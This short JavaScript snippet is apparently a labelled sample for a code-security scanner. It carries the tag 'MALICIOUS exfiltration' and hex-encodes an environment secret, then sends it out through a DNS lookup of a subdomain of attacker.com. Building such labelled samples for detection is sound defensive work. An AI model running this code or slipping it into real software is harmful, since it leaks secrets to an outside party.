// codesure: MALICIOUS exfiltration
const dns = require('dns');
const secret = Buffer.from(process.env.SECRET).toString('hex');
dns.resolve(`${secret}.attacker.com`, () => {});
